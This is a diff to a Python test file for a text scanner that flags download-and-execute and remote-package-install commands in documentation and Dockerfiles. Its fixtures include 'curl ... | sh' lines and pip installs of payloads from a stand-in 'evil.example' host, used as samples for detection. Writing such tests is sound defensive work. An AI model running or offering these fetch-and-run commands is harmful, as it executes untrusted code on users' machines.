@@ -685,6 +685,11 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         'RUN ["/usr/bin/curl", "https://example.com/artifact"]\n',
         'ENTRYPOINT ["sh", "-c", "curl https://example.com/artifact"]\n',
         'RUN ["/bin/bash", "-lc", "wget https://example.com/artifact"]\n',
+        'RUN ["sh", "-c", "curl https://example.com/artifact | sh"]\n',
+        "ADD https://example.com/artifact /tmp/artifact\n",
+        "ADD --checksum=sha256:abc https://example.com/artifact /tmp/artifact\n",
+        "> - curl https://example.com/artifact | sh\n",
+        "> 1. wget https://example.com/artifact\n",
     ],
 )
 def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path: Path, content: str) -> None:
@@ -722,6 +727,8 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         "The command and exec builtins are documented at https://docs.example.com/shell.\n",
         'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
         "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
+        "Docker ADD documentation: https://docs.example.com/dockerfile.\n",
+        "> - Use curl for downloads; see https://docs.example.com/shell.\n",
     ],
 )
 def test_text_scanner_documentation_command_prefix_prose_remains_informational(
@@ -849,6 +856,8 @@ def test_text_scanner_env_prefixed_download_prose_remains_informational(tmp_path
         "uv pip install https://evil.example/payload.whl\n",
         "npm install https://evil.example/payload.tgz\n",
         "1. pip install https://evil.example/payload.whl\n",
+        "pip --proxy http://proxy.internal install https://evil.example/payload.whl\n",
+        "python -m pip --timeout 5 install https://evil.example/pkg.tar.gz\n",
     ],
 )
 def test_text_scanner_documentation_package_install_urls_remain_actionable(
@@ -879,6 +888,18 @@ def test_text_scanner_documentation_package_manager_prose_remains_informational(
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_pip_general_option_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "The pip --proxy option is documented at https://pip.pypa.io/en/stable/.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 def test_text_scanner_package_install_comment_url_is_informational(tmp_path: Path) -> None:
